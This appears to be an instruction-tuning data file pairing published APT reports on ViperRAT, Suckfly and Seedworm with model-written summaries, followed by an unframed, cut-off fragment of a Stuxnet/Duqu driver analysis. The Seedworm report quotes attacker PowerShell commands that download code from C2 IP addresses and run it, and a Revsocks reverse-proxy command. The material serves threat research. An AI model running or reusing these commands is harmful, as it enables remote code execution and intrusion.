    "instruction": "Can you analyze and summarize the key insights from the APT report titled Lookout_ViperRAT-IDF(02-16-2017) issued in 2017? Here's the report:\nBig Headline: By Michael Flossman, Security Researcher\nViperRAT is an active, advanced persistent threat (APT) that sophisticated threat actors are actively using to target and spy on the Israeli Defense Force.\nThe threat actors behind the ViperRAT surveillanceware collect a significant amount of sensitive information off of the device, and seem most interested in exfiltrating images and audio content. The attackers are also hijacking the device camera to take pictures.\nUsing data collected from the Lookout global sensor network, the Lookout research team was able to gain unique visibility into the ViperRAT malware, including 11 new, unreported applications. We also discovered and analyzed live, misconfigured malicious command and control servers (C2), from which we were able to identify how the attacker gets new, infected apps to secretly install and the types of activities they are monitoring. In addition, we uncovered the IMEIs of the targeted individuals (IMEIs will not be shared publicly for the privacy and safety of the victims) as well as the types of exfiltrated content.\nIn aggregate, the type of information stolen could let an attacker know where a person is, with whom they are associated (including contacts' profile photos), the messages they are sending, the websites they visit and search history, screenshots that reveal data from other apps on the device, the conversations they have in the presence of the device, and a myriad of images including anything at which device's camera is pointed.\nLookout has determined ViperRAT is a very sophisticated threat that adds to the mounting evidence that targeted mobile attacks against governments and business is a real problem.\nLookout researchers have been tracking this threat for the last month. Given that this is an active threat, we've been working behind-the-scenes with our customers to ensure both personal and enterprise customers are protected from (<https://securelist.com/blog/incidents/77562/breaking-the-weakest-link-of-the-strongest-chain/>)this threat and only decided to come forward with this information after the research team at Kaspersky released a report earlier today.\nAdditionally, we have determined that though original reports of this story attribute this surveillanceware tool to Hamas, this may not be the case, as we demonstrate below.\n\n<[ENDING OF SECTION]>\n\nBig Headline: The increasing sophistication of surveillanceware\nThe structure of the surveillanceware indicates it is very sophisticated. Analysis indicates there are currently two distinct variants of ViperRAT. The first variant is a \"first stage application,\" that performs basic profiling of a device, and under certain conditions attempts to download and install a much more comprehensive surveillanceware\ncomponent, which is the second variant.\nThe first variant involves social engineering the target into downloading a trojanized app. Previous reports alleged this surveillanceware tool was deployed using 'honey traps' where the actor behind it would reach out to targets via fake social media profiles of young women. After building an initial rapport with targets, the actors behind these social media accounts would instruct victims to install an additional app for easier communication. Specifically, Lookout determined these were trojanized versions of the apps SR Chat and YeeCall Pro. We also uncovered ViperRAT in a billiards game, an Israeli Love Songs player, and a Move To iOS app.\nBig Headline: The second stage\nThe second stage apps contain the surveillanceware capabilities. Lookout uncovered nine secondary payload applications:\n* These apps have not been previously reported and were discovered using data from the Lookout global sensor network, which collects app and device information from over 100 million sensors to provide researchers and customers with a holistic look at the mobile threat ecosystem today.\nNaming additional payload applications as system updates is a clever technique used by malware authors to trick victims into believing a threat isn't present on their device. ViperRAT takes this one step further by using its dropper app to identify an appropriate second stage 'update' that may go unnoticed. For example, if a victim has Viber on their device, it will choose to retrieve the Viber Update second stage. If he doesn't have Viber, the generically-named System Updates app gets downloaded and installed instead.\nBig Headline: What was taken\nThe actors behind ViperRAT seem to be particularly interested in image data. We were able to identify that 8,929 files had been exfiltrated from compromised devices and that the overwhelming majority of these, 97 percent, were highly likely encrypted images taken using the device camera. We also observed automatically generated files on the C2, indicating the actor behind this campaign also issues commands to search for and exfiltrate PDF and Office documents. This should be highly alarming to any government agency or enterprise.\nWe observed legitimate exfiltrated files of the following types of data:\nContact information\nCompressed recorded audio in the Adaptive Multi-Rate (amr) file format\nImages captured from the device camera\nImages stored on both internal device and SDCard storage that are listed in the MediaStore\nDevice geolocation information\nSMS content\nChrome browser search history and bookmarks\nCall log information\nCell tower information\nDevice network metadata; such as phone number, device software version, network country, network operator, SIM country, SIM operator, SIM serial, IMSI, voice mail number, phone type, network type, data state, data activity, call state, SIM state, whether device is roaming, and if SMS is supported.\nStandard browser search history\nStandard browser bookmarks\nDevice handset metadata; such as brand, display, hardware, manufacturer, product, serial, radio version, and SDK.\nMedium Headline: On attribution\nMedia reporting on ViperRAT thus far attributes this surveillanceware tool to Hamas. Israeli media published the first\nreports about the social networking and social engineering aspects of this campaign. However it's unclear whether organizations that later reported on ViperRAT performed their own independent research or simply based their content on the original Israeli report. Hamas is not widely known for having a sophisticated mobile capability, which makes it unlikely they are directly responsible for ViperRAT.\nViperRAT has been operational for quite some time, with what appears to be a test application that surfaced in late 2015. Many of the default strings in this application are in Arabic, including the name. It is unclear whether this means early samples were targeting Arabic speakers or if the developers behind it are fluent in Arabic.\nThis leads us to believe this is another actor.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\nThe report \"Lookout_ViperRAT-IDF(02-16-2017)\" details an advanced persistent threat (APT) named ViperRAT, which is being used to target and spy on the Israeli Defense Force. This sophisticated malware collects sensitive information, particularly images and audio content, and has been linked to social engineering tactics involving fake social media accounts.\n\n### Critical Observations\nThe report highlights several key points related to the establishment of social media accounts for social engineering purposes. According to the analysis, the threat actors behind ViperRAT utilized fake social media profiles of young women to engage with their targets. These profiles were used to build rapport with potential victims, who were then instructed to install trojanized apps for easier communication. Specifically, the report mentions that the actors used social engineering tactics to convince targets to download malicious versions of apps like SR Chat and YeeCall Pro. Additionally, the malware was found in other seemingly innocuous apps such as a billiards game, an Israeli Love Songs player, and a Move To iOS app. This strategy allowed the attackers to gain initial access to the victims' devices, facilitating the installation of the ViperRAT surveillanceware.\n\n### Conclusion\nThe use of fake social media accounts played a crucial role in the success of the ViperRAT campaign. By establishing these accounts and developing personas, the attackers were able to effectively target and engage with members of the Israeli Defense Force. This social engineering tactic enabled the initial access phase of the attack, allowing the threat actors to distribute trojanized apps that ultimately led to the installation of the sophisticated ViperRAT malware. Through this method, the attackers were able to exfiltrate a significant amount of sensitive information, including images, audio content, and other personal data, thereby achieving their goal of spying on their targets.",

    "instruction": "From a cybersecurity analyst's viewpoint, can you summarize the core findings and insights in the APT report Symantec_Suckfly-Revealing-the secret-life-of-your-code-signing-certificates(Mar-15-16) published in 2016?\nBig Headline: Symantec Official Blog\nSuckfly: Revealing the secret life of your code signing certificates\nA China\u00adbased APT group has an insatiable appetite for stolen code\u00adsigning certificates.\nBy: SYMANTEC EMPLOYEE\nCreated 15 Mar 2016 \ue8030\n\ue811 Share\nView the for this attack group.\nMany security\u00adminded organizations utilize code signing to provide an additional layer of security and authenticity for their software and files. Code signing is carried out using a type of digital certificate known as a code\u00adsigning certificate. The process of code signing validates the authenticity of legitimate software by confirming that an application is from the organization who signed it. While code\u00adsigning certificates can offer more security, they can also live an unintended secret life providing cover for attack groups, such as the Suckfly APT group.\nIn late 2015, Symantec identified suspicious activity involving a hacking tool used in a malicious manner against one of our customers. Normally, this is considered a low\u00adlevel alert easily defeated by security software. In this case, however, the hacktool had an unusual characteristic not typically seen with this type of file; it was signed with a valid code\u00adsigning certificate. Many hacktools are made for less than ethical purposes and are freely available, so this was an initial red flag, which led us to investigate further.\nAs our investigation continued, we soon realized this was much larger than a few hacktools. We discovered Suckfly, an advanced threat group, conducting targeted attacks using multiple stolen certificates, as well as hacktools and custom malware. The group had obtained the certificates through pre\u00adattack operations before commencing targeted attacks against a number of government and commercial organizations spread across multiple continents over a two\u00adyear period. This type of activity and the malicious use of stolen certificates emphasizes the importance of safeguarding certificates to prevent them from being used maliciously.\n\n<[ENDING OF SECTION]>\n\nMedium Headline: An appetite for stolen code\u00adsigning certificates\nSuckfly has a number of hacktools and malware varieties at its disposal. Figure 1 identifies the malware and tools based on functionality and the number of signed files with unique hashes associated with them.\nThe first signed hacktool we identified in late 2015 was a digitally signed brute\u00adforce server message block (SMB) scanner. The organization associated with this certificate is a South Korean mobile software developer. While we became initially curious because the hacktool was signed, we became more suspicious when we realized a mobile software developer had signed it, since this is not the type of software typically associated with a mobile application.\nBased on this discovery, we began to look for other binaries signed with the South Korean mobile software developer's certificate. This led to the discovery of three additional hacktools also signed using this certificate. In addition to being signed with a stolen certificate, the identified hacktools had been used in suspicious activity against a US\u00adbased health provider operating in India. This evidence indicates that the certificate's rightful owner either misused it or it had been stolen from them. Symantec worked with the certificate owner to confirm that the hacktool was not associated with them.\nFollowing the trail further, we traced malicious traffic back to where it originated from and looked for additional evidence to indicate that the attacker persistently used the same infrastructure. We discovered the activity originated from three separate IP addresses, all located in Chengdu, China.\nIn addition to the traffic originating from Chengdu, we identified a selection of hacktools and malware signed using nine stolen certificates.\nThe nine stolen certificates originated from nine different companies who are physically located close together around the central districts of Seoul, South Korea. Figure 2 shows the region in which the companies are located.\nWhile we do not know the exact circumstances of how the certificates were stolen, the most likely scenario was that the companies were breached with malware that had the ability to search for and extract certificates from within the organization. .\nThe organizations who owned the stolen certificates were from four industries (see Figure 3).\nMedium Headline: A timeline of misuse\nWe don't know the exact date Suckfly stole the certificates from the South Korean organizations. However, by analyzing the dates when we first saw the certificates paired with hacktools or malware, we can gain insight into when the certificates may have been stolen. Figure 4 details how many times each stolen certificate was used in a given month.\nThe first sighting of three of the nine stolen certificates being used maliciously occurred in early 2014. Those three certificates were the only ones used in 2014, making it likely that the other six were not compromised until 2015. All nine certificates were used maliciously in 2015.\nBased on the data in Figure 4, the first certificates used belonged to Company A (educational software developer) and Company B (video game developer #2). Company A's certificate was used for over a year, from April 2014 until June 2015 and Company B's certificate was used for almost a year, from July 2014 until June 2015. When we discovered this activity, neither company was aware that their certificates had been stolen or how they were being used. Since the companies were unaware of the activity, neither stolen certificate had been revoked. When a certificate is revoked, the computer displays a window explaining that the certificate cannot be verified and should not be trusted before asking the user if they want to continue with the installation.\nMedium Headline: Signed, sealed, and delivered\nAs noted earlier, the stolen certificates Symantec identified in this investigation were used to sign both hacking tools and malware. Further analysis of the malware identified what looks like a custom back door. We believe Suckfly specifically developed the back door for use in cyberespionage campaigns. Symantec detects this threat as .\nAnalysis of Nidiran samples determined that the back door had been updated three times since early 2014, which fits the timeline outlined in Figure 4. The modifications were minor and likely performed to add capabilities and avoid detection. While the malware is custom, it only provides the attackers with standard back door capabilities.\nSuckfly delivered Nidiran through a strategic web compromise. Specifically, the threat group used a specially crafted web page to deliver an exploit for the (CVE\u00ad2014\u00ad6332), which affects specific versions of Microsoft Windows. This exploit is triggered when a potential victim browses to a malicious page using Internet Explorer, which can allow the attacker to execute code with the same privileges as the currently logged\u00adin user.\nOnce exploit has been achieved, Nidiran is delivered through a self\u00adextracting executable that extracts the components to a .tmp folder after it has been executed. The threat then executes \"svchost.exe\", a PE file, which is actually a clean tool known as OLEVIEW.EXE. The executable will then load iviewers.dll, which is normally a clean, legitimate file. Attackers have been known to distribute malicious files masquerading as the legitimate iviewers.dll file and then use DLL load hijacking to execute the malicious code and infect the computer. This and is frequently used in China\u00adbased cyberespionage activity.\nMedium Headline: High demand for code\u00adsigning certificates\nThe Blackfly attacks share some similarities with the more recent Suckfly attacks. Blackfly began with a campaign to steal certificates, which were later used to sign malware used in targeted attacks. The certificates Blackfly stole were also from South Korean companies, primarily in the video game and software development industry. Another similarity is that Suckfly stole a certificate from Company D (see Figure 4) less than two years after Blackfly had stolen a certificate from the same company. While the stolen certificates were different, and stolen in separate instances, they were both used with custom malware in targeted attacks originating from China.\nMedium Headline: Why do attackers want signed malware?\nSigning malware with code\u00adsigning certificates is becoming more common, as seen in this investigation and the other attacks we have discussed. Attackers are taking the time and effort to steal certificates because it is becoming necessary to gain a foothold on a targeted computer. Attempts to sign malware with code\u00adsigning certificates have become more common as the Internet and security systems have moved towards a more trust and reputation oriented model. This means that untrusted software may not be allowed to run unless it is signed.\nHowever, using valid code\u00adsigning certificates stolen from organizations with a positive reputation can allow attackers to piggyback on that company's trust, making it easier to slip by these defenses and gain access to targeted computers.\nMedium Headline: Conclusion\nSuckfly paints a stark picture of where cyberattack groups and cybercriminals are focusing their attentions. Our investigation shines a light on an often unknown and seedier secret life of code\u00adsigning certificates, which is completely unknown to their owners. The implications of this study shows that certificate owners need to keep a careful eye on them to prevent them from falling into the wrong hands. It is important to give certificates the protection they need so they can't be used maliciously.\nThe certificates are only as secure as the safeguards that organizations put around them. Once a certificate has been compromised, so has the reputation of the organization who signed it. An organization whose certificate has been stolen and used to sign malware will always be associated with that activity.\nSymantec monitors for this type of activity to help prevent organizations from being tied to malicious actions undertaken with their stolen certificates. During the course of this investigation, we ensured that all certificates compromised by Suckfly were revoked and the affected companies notified.\nAs this trend grows, it is more important than ever for organizations to maintain strong cybersecurity practices and store their certificates and corresponding (<http://www.symantec.com/code-signing/extended-validation/data-sheets-white-papers/>)keys in a secure environment. Using encryption, and services such as , and can provide additional layers of security.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\nThe Symantec report titled \"Suckfly: Revealing the secret life of your code signing certificates\" discusses the activities of a China-based Advanced Persistent Threat (APT) group named Suckfly. This group has been involved in the theft and misuse of code-signing certificates to carry out targeted attacks against various organizations. The report highlights the importance of safeguarding code-signing certificates to prevent their malicious use.\n\n### Critical Observations\n1. **Obtain Capabilities: Code Signing Certificates**\n   - Suckfly has been actively stealing code-signing certificates from various organizations, particularly those based in South Korea. These certificates were used to sign hacking tools and malware, making them appear legitimate.\n   - The group obtained certificates through pre-attack operations, which likely involved breaching the target organizations and extracting the certificates.\n   - The stolen certificates were used to sign malware and hacking tools, allowing the malicious software to bypass security measures that rely on code signing for trust verification.\n\n2. **Masquerading: Masquerade Task or Service**\n   - Suckfly employed tactics to make their malicious activities appear legitimate. For instance, they used a digitally signed brute-force SMB scanner that was signed with a certificate from a South Korean mobile software developer.\n   - The group also delivered a custom backdoor called Nidiran through a strategic web compromise, using a specially crafted web page to exploit the CVE-2014-6332 vulnerability in Microsoft Windows.\n   - The malware was delivered through a self-extracting executable that extracted components to a .tmp folder, executed a clean tool known as OLEVIEW.EXE, and loaded a legitimate file (iviewers.dll) to perform DLL load hijacking.\n\n3. **Masquerading**\n   - Suckfly manipulated the names and locations of their artifacts to evade detection. They renamed legitimate tools and used them for malicious purposes, such as using OLEVIEW.EXE and iviewers.dll in their attacks.\n   - By masquerading their activities, the group aimed to deceive both users and security tools, making it harder to identify and mitigate their malicious actions.\n\n4. **CVE-2014-6332**\n   - The report mentions the use of the CVE-2014-6332 vulnerability, which allows remote attackers to execute arbitrary code via a crafted website.\n   - Suckfly exploited this vulnerability to deliver their custom backdoor, Nidiran, through a strategic web compromise. This enabled them to gain control over targeted systems.\n\n### Conclusion\nThe topics discussed in the critical observations highlight how Suckfly leveraged stolen code-signing certificates and masquerading techniques to carry out their attacks effectively. By obtaining and misusing code-signing certificates, the group was able to sign their malicious tools and malware, making them appear legitimate and bypassing security measures. Additionally, by masquerading their activities and exploiting vulnerabilities like CVE-2014-6332, Suckfly could evade detection and gain a foothold on targeted systems. This combination of tactics allowed the group to conduct successful cyberespionage campaigns against various organizations, underscoring the importance of securing code-signing certificates and implementing robust cybersecurity practices.",

    "instruction": "Based on the APT report Symantec_Seedworm-Iranian-Hackers-Target-Telecoms-Orgs-North-East-Africa(12-19-2023) from 2023, can you summarize the security vulnerabilities and threats identified?\nFull report:\nSeedworm: Iranian Hackers Target Telecoms Orgs in North and East Africa\nIranian espionage group Seedworm (aka Muddywater) has been targeting organizations operating in the telecommunications sector in Egypt, Sudan, and Tanzania.\nSeedworm has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East. It has been (<https://attack.mitre.org/groups/G0069/>)publicly stated that Seedworm is a cyberespionage group that is believed to be a subordinate part of Iran's Ministry of Intelligence and Security (MOIS).\nThe attackers used a variety of tools in this activity, which occurred in November 2023, (<https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel>)including leveraging the MuddyC2Go infrastructure, which was recently documented by Deep Instinct. Researchers on Symantec's Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.\nThe attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with Seedworm activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools.\n\n<[ENDING OF SECTION]>\n\nBig Headline: Attack Chain\nThe attacks in this campaign occurred in November 2023. Most of the activity we observed occurred on one telecommunications organization. The first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor.\nA MuddyC2Go launcher named \"vcruntime140.dll\" was saved in the folder \"csidl_common_appdata\\javax\", which seems to have been sideloaded by jabswitch.exe. Jabswitch.exe is a legitimate Java Platform SE 8 executable.\nThe MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server:\ntppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjy fiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjyfiqnqp trfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri =\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;\nIt appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection by security software, as they are unused and not relevant.\nRight after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created:\n\"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\"\nThe attackers also used some typical commands related to the Impacket WMIExec hacktool:\nThe SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool:\nCSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q\nThe attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine:\n$uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;\nNotably, this organization is believed to have previously been infiltrated by Seedworm earlier in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including:\nLaunching PowerShell\nLaunching a proxy tool\nDumping SAM hives\nUsing WMI to get drive info\nInstalling the JumpCloud remote access software\nDelivering proxy tools, a suspected LSASS dump tool, and a port scanner.\nDuring that intrusion, it's believed the attackers used WMI to launch the SimpleHelp installer on the victim network. At the time, this activity couldn't be definitively linked to Seedworm, but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers.\nIn another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known Seedworm infrastructure. A custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity.\nIn the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity in the past.\nBig Headline: Toolset\nThe most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe.\nThe malware reads the C&C URL from the Windows registry value \"End\" stored inside the key \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\". The URL path is read from the \"Status\" value in the same aforementioned key.\nLastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received:\npowershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;\nOther tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines. SimpleHelp is (<https://www.group-ib.com/blog/muddywater-infrastructure/>)believed to have been used in attacks carried out by Seedworm since at least July 2022. Once installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user's device at any point in time, even after a reboot. SimpleHelp also allows attackers to execute commands on a device with administrator privileges. SimpleHelp is now strongly associated with Seedworm activity and the tool is installed on several of Seedworm's servers.\nVenom Proxy is (<https://github.com/Dliv3/Venom/blob/master/README-en.md>)a publicly available tool that is described as \"a multi-hop proxy tool developed for penetration testers.\" It is written in Go. It can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with (<https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/>)Seedworm since at least mid-2022, with Microsoft describing it as Seedworm's \"tool of choice\" in an August 2022 blog. Seedworm tends to use a custom build of Venom Proxy in its activity.\nOther tools used in this activity include:\nRevsocks - A cross-platform (<https://github.com/emilarner/revsocks>)SOCKS5 proxy server program/library written in C that can also reverse itself over a firewall.\nAnyDesk - A legitimate (<https://anydesk.com/en>)remote desktop application. It and similar tools are often used by attackers to obtain remote access to computers on a network.\nPowerShell - Seedworm makes heavy use of PowerShell, as well as PowerShell-based tools and scripts in its attacks. PowerShell is a (<https://learn.microsoft.com/en-us/powershell/>)Microsoft scripting tool that can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance.\nCustom keylogger\nBig Headline: Conclusion\nSeedworm has long had an interest in telecommunications organizations, as do many groups engaged in cyberespionage activities. However, its strong focus on African organizations in this campaign is notable as, while it has been known to target organizations in Africa in the past, it does generally primarily focus on organizations in countries in the Middle East. That one of the victim organizations in this campaign is based in Egypt is also of note given Egypt's proximity to Israel, a frequent target of Seedworm.\nSeedworm appears to remain focused on using a wide array of living-off-the-land and publicly available tools in its attack chains, no doubt in an effort to remain undetected on victim networks for as long as possible. However, its recent more wide adoption of new C&C infrastructure in the form of MuddyC2Go is notable and shows that the group continues to innovate and develop its toolset when required in order to keep its activity under the radar. While the group uses a lot of living-off-the-land and publicly available tools, it is also capable of developing its own custom tools, such as the custom build of Venom Proxy and the custom keylogger used in this campaign. The group still makes heavy use of PowerShell and PowerShell-related tools and scripts, underlining the need for organizations to be aware of suspicious use of PowerShell on their networks.\nThe activity observed by Symantec's Threat Hunter Team took place in November 2023, showing that Seedworm is very much a currently active threat faced by organizations that may be of strategic interest to Iranian threat actors.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\nThe report titled \"Symantec_Seedworm-Iranian-Hackers-Target-Telecoms-Orgs-North-East-Africa(12-19-2023)\" details the activities of the Iranian espionage group Seedworm (also known as Muddywater) targeting telecommunications organizations in Egypt, Sudan, and Tanzania in November 2023. Seedworm, believed to be a subordinate part of Iran's Ministry of Intelligence and Security (MOIS), used various tools and techniques to infiltrate these organizations.\n\n### Critical Observations\n**Scheduled Task/Job:**\n- The attackers leveraged the Windows Task Scheduler to execute the MuddyC2Go malware using a scheduled task named \"Microsoft\\Windows\\JavaX\\Java Autorun.\" This task was created to ensure the malware ran persistently on the infected systems.\n- The scheduled task was executed using the command: `\"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\"`.\n\n**Reconnaissance:**\n- The attackers conducted reconnaissance activities using PowerShell scripts and tools like SimpleHelp and Venom Proxy. They executed commands related to the Impacket WMIExec hacktool, which is commonly used for reconnaissance and lateral movement.\n- PowerShell was heavily used to download and execute additional payloads, traverse compromised networks, and carry out reconnaissance.\n\n**Persistence:**\n- The attackers used SimpleHelp, a legitimate remote device control and management tool, to maintain persistence on victim machines. SimpleHelp was configured to run as a system service, allowing constant access even after reboots.\n- AnyDesk, another legitimate remote desktop application, was deployed alongside SimpleHelp and Revsocks to ensure continuous access to the compromised systems.\n\n**Defense Evasion:**\n- The attackers attempted to bypass detection by using unused variables in their PowerShell code, which served no functional purpose but could confuse security software.\n- They also employed living-off-the-land tools and publicly available hacking tools like Venom Proxy and Revsocks to blend in with legitimate system activities and avoid detection.\n- The MuddyC2Go launcher was sideloaded by a legitimate Java executable (jabswitch.exe) to mask its execution.\n\n### Conclusion\nThe topics of scheduled tasks, reconnaissance, persistence, and defense evasion were crucial in enabling Seedworm to achieve their goals. By leveraging scheduled tasks, the attackers ensured that their malware remained active and could execute at specific times, maintaining a persistent presence on the compromised systems. Reconnaissance activities allowed them to gather valuable information about the target organizations, which was essential for planning further attacks and lateral movement. Persistence techniques, such as the use of SimpleHelp and AnyDesk, ensured that the attackers could retain access to the systems even after reboots. Defense evasion tactics, including the use of living-off-the-land tools and obfuscated PowerShell scripts, helped the attackers avoid detection and prolong their presence within the targeted networks. Overall, these combined strategies enabled Seedworm to successfully infiltrate and maintain control over the telecommunications organizations in North and East Africa.",

Despite the large volume of data obtained (most of which has yet to be published), we still lack the answer to the fundamental question - who is behind Duqu?\nIn addition, there are other issues, mostly to do with the creation of the Trojan, or rather the platform used to implement Duqu as well as Stuxnet.\nIn terms of architecture, the platform used to create Duqu and Stuxnet is the same. This is a driver file which loads a main module designed as an encrypted library. At the same time, there is a separate configuration file for the whole malicious complex and an encrypted block in the system registry that defines the location of the module being loaded and name of the process for injection.\nConventional platform architecture for Stuxnet and Duqu\nThis platform can be conventionally named as 'Tilded' as its authors are, for some reason, inclined to use file names which start with \"~d\".\nWe believe Duqu and Stuxnet were simultaneous projects supported by the same team of developers.\nSeveral other details have been uncovered which suggest there was possibly at least one further spyware module based on the same platform in 2007-2008, and several other programs whose functionality was unclear between 2008 and 2010.\nThese facts significantly challenge the existing \"official\" history of Stuxnet. We will try to cover them in this publication, but let us first recap the story so far.\n\n<[ENDING OF SECTION]>\n\nBig Headline: The 'official' Stuxnet story\nLet me start with a question: how many Stuxnet driver files are known? As of today, the correct answer would be four. See below for more information about them.\nThe first modification of the Stuxnet worm, created in 2009, used only one driver file - mrxcls.sys without a digital signature.\nIn 2010, the authors created the second driver mrxnet.sys (to hide the worm's component files on USB drives) and equipped mrxnet.sys and mrxcls.sys drivers with digital certificates from Realtek. The mrxnet.sys driver is of no great significance to our story, as it is a separate module not included into the general architecture of the platform.\nOn 17 July 2010, ESET detected another driver \"in the wild\" - jmidebs.sys - which was very similar to the already known mrxcls.sys, but had been created just three days before it was discovered. This driver was backed with a new certificate - this time from Jmicron.\nUntil recently it was unclear what the purpose of this file was, but popular opinion held that it was related to Stuxnet. One theory is that the Stuxnet C&C was trying to replace the old version with the Realtek certificate with a new one. In doing so, the authors of the worm were either hoping to prevent it being picked up by antivirus programs, or were replacing a certificate which had been blocked.\nUnfortunately, this theory has not been confirmed - Jmidebs.sys has never been detected anywhere. A new version of Stuxnet capable of installing the file has also not been found.\nThis is the official history of Stuxnet. However, as I mentioned above, in the course of our research we have discovered new evidence which will be discussed below.\nMedium Headline: rtniczw.sys\nWhile analyzing a user incident involving Duqu, we discovered something new - something that could, potentially, affect the whole Stuxnet story as we know it.\nA strange file was discovered on the victim's computer, which was detected by our antivirus engine as Rootkit.Win32.Stuxnet.a. This verdict was supposed to correspond to the known file mrxcls.sys described above, but the detected file's name and checksum were different!\nThe file was rtniczw.sys, 26,872 bytes in size, MD5 546C4BBEBF02A1604EB2CAAAD4974DE0.\nThe file was a little larger than mrxcls.sys, which had a Realtek digital signature. This implied that rtniczw.sys also had a digital signature. We managed to get a copy of the file, and we were amazed to find that it used the same Realtek certificate, but with a different file signing date from mrxcls.sys: rtniczw.sys was signed on 18 March 2010, while the mrxcls driver had been signed on 25 January of the same year.\nIn addition, rtniczw.sys used a registry key and configuration data block that was not used in Stuxnet. Stuxnet used the key \"MRxCls\" and the value \"Data\", while in the case of rtniczw.sys, the key was \"rtniczw\" and the value was \"Config\".\nDetailed analysis of the code found in rtniczw.sys identified no other differences from the 'reference' driver: this was the same mrxcls.sys file, created in the same year, on the same day and hour - on 1 January 2009.\nWe searched for additional information about other users who had the same file, but were unable to find anything! Moreover, we could find no information at all about the file's name (rtniczw.sys) or its MD5 in any search engine. The file had been identified only once: it had been sent for scanning to VirusTotal from China in May 2011.\nApparently, the system that we were studying had been infected in late August 2011. It should be noted that we did not find a Stuxnet infection on the system: no additional files from the Stuxnet kit had been found. However, we did find Duqu files.\nWe came to the conclusion that there could be other driver files similar to the \"reference\" file mrxcls.sys, which are not among known variants of Stuxnet.\nMedium Headline: rndismpc.sys\nA check in our malware collection helped identify another interesting file that was included in the collection over a year ago. The file is named rndismpc.sys, it is 19,968 bytes in size, MD5 9AEC6E10C5EE9C05BED93221544C783E.\nThis turned out to be another driver, with functionality very nearly identical to that of mrxcls.sys apart from the following exceptions:\n1. rndismpc.sys uses a registry key that is different from the keys used by both mrxcls and rtniczw - it is the key \"rndismpc\" with the value \"Action\";\n2. it uses an encryption key that is different from that used by mrxcls/rtniczw - 0x89CF98B1;\n3. the file's compilation date is 20 January 2008, i.e. a year before mrxcls/rtniczw were created.\nLike rtniczw.sys, the file rndismpc.sys had never been encountered on our users' machines. We do not know which malicious program installed it or which main module it was supposed to work with.\nBig Headline: The connecting link: mrxcls.sys --> jmidebs.sys -->Duqu drivers\nThe data obtained and the available information about the drivers used in Duqu (see The Mystery of Duqu, (<http://kasperskycontenthub.com/securelist/?p=31177>)Part One and (<http://kasperskycontenthub.com/securelist/?p=31445>)Part Two) can be summed up in the table below:\n*Known Duqu drivers have unique file names for each of the variants. Their functionality, however, is absolutely identical.\nAccording to our analysis, jmidebs.sys is the connecting link between mrxcls.sys and the drivers later used in Duqu.\nThe code of mrxcls and jmidebs drivers is largely similar. Some small differences may be due to different settings and minimal changes in the source code, while the point of the code remains the same.\nHowever, more significant changes can be found in several functions:\n1. The service function which obtains addresses of API functions:\nThe version in mrxcls uses the function MmGetSystemRoutineAddress for this purpose and the respective text names of the addresses of incoming API functions. The version in jmidebs calls its own functions to obtain API addresses using hash-sums of their names. The same functions are used in Duqu drivers, while the list of functions' hashes is twice as long.\n2. The function which creates stubs to inject PNF DLL into processes:\nThe mrxcls version uses a stub with a total size of 6332 bytes.\nThe jmidebs and Duqu drivers use stubs with a total size of 7061 bytes. The code used in the stub modules for these drivers is identical, but has different compilation dates.\nBig Headline: rndismpc.sys, rtniczw.sys and jmidebs.sys\nAs you can see from the diagram, it 